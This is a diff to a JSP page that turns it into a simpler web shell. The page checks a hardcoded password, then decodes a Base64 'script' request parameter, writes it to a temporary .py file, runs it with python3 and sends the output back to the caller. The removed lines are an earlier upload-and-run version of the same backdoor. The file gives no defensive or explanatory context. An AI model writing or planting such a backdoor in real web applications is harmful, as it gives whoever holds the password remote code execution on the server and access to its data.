@@ -3,22 +3,9 @@
     // Define the hardcoded password for authentication
     final String hardcodedPassword = "TheHermitKingdom2024__";
 
-    // Retrieve password from the request
-    String password = null;
-    if (request.getContentType() != null && request.getContentType().toLowerCase().contains("multipart/form-data")) {
-        try {
-            Part passwordPart = request.getPart("password");
-            if (passwordPart != null) {
-                BufferedReader reader = new BufferedReader(new InputStreamReader(passwordPart.getInputStream()));
-                password = reader.readLine(); // Read the password value
-                reader.close();
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-            out.print("Error retrieving password: " + e.getMessage());
-            return;
-        }
-    }
+    // Retrieve password and Base64-encoded script from the request
+    String password = request.getParameter("password");
+    String base64Script = request.getParameter("script");
 
     // Validate password
     if (password == null || !password.trim().equals(hardcodedPassword)) {
@@ -26,72 +13,50 @@
         return;
     }
 
-    // Define the directory to save uploaded scripts (same as virtual packages)
-    String uploadDir = application.getRealPath("/") + "opt/tomcat/webapps/docs/netspi/netspi/aggregate/";
-    File dir = new File(uploadDir);
-    if (!dir.exists()) {
-        dir.mkdir();
+    // Validate script
+    if (base64Script == null || base64Script.isEmpty()) {
+        out.print("Error: No script provided.");
+        return;
     }
 
-    // Handle file upload
-    String scriptFilePath = null;
-    File scriptFile = null;
-    if (request.getContentType() != null && request.getContentType().toLowerCase().contains("multipart/form-data")) {
-        try {
-            Part filePart = request.getPart("scriptFile");
-            String fileName = new File(filePart.getSubmittedFileName()).getName();
-            scriptFilePath = uploadDir + fileName;
-            scriptFile = new File(scriptFilePath);
-
-            // Save the uploaded file
-            filePart.write(scriptFilePath);
-        } catch (Exception e) {
-            e.printStackTrace();
-            out.print("File upload failed: " + e.getMessage());
-            return;
+    // Decode Base64 script and write it to a temporary file
+    File tempScriptFile = null;
+    try {
+        String decodedScript = new String(java.util.Base64.getDecoder().decode(base64Script));
+        tempScriptFile = File.createTempFile("script", ".py");
+        try (BufferedWriter writer = new BufferedWriter(new FileWriter(tempScriptFile))) {
+            writer.write(decodedScript);
         }
-    }
 
-    // Execute the uploaded Python script
-    if (scriptFilePath != null && scriptFile.exists()) {
-        try {
-            // Use system-wide Python or default Python available in the PATH
-            String pythonPath = "python3";
-            ProcessBuilder pb = new ProcessBuilder(pythonPath, scriptFilePath);
+        // Execute the script
+        String pythonPath = "python3"; // Use system-wide Python
+        ProcessBuilder pb = new ProcessBuilder(pythonPath, tempScriptFile.getAbsolutePath());
+        Process process = pb.start();
 
-            System.out.println("Executing command: " + pythonPath + " " + scriptFilePath);
+        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
 
-            // Execute the script and capture output
-            Process process = pb.start();
-
-            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
-
-            StringBuilder output = new StringBuilder();
-            String line;
-            while ((line = reader.readLine()) != null) {
-                output.append(line).append("\n");
-            }
-
-            while ((line = errorReader.readLine()) != null) {
-                output.append("ERROR: ").append(line).append("\n");
-            }
-
-            reader.close();
-            errorReader.close();
-
-            System.out.println("Execution output: " + output.toString());
-            out.print(output.toString());
-        } catch (Exception e) {
-            e.printStackTrace();
-            out.print("Error executing script: " + e.getMessage());
-        } finally {
-            // Ensure the script file is deleted after execution
-            if (scriptFile.exists() && !scriptFile.delete()) {
-                out.print("\nWARNING: Unable to delete the script file after execution.");
-            }
+        StringBuilder output = new StringBuilder();
+        String line;
+        while ((line = reader.readLine()) != null) {
+            output.append(line).append("\n");
         }
-    } else {
-        out.print("No script uploaded for execution.");
+        while ((line = errorReader.readLine()) != null) {
+            output.append("ERROR: ").append(line).append("\n");
+        }
+
+        reader.close();
+        errorReader.close();
+
+        // Return script output to the client
+        out.print(output.toString());
+    } catch (Exception e) {
+        e.printStackTrace();
+        out.print("Error processing the script: " + e.getMessage());
+    } finally {
+        // Delete the temporary script file
+        if (tempScriptFile != null && tempScriptFile.exists()) {
+            tempScriptFile.delete();
+        }
     }
 %>
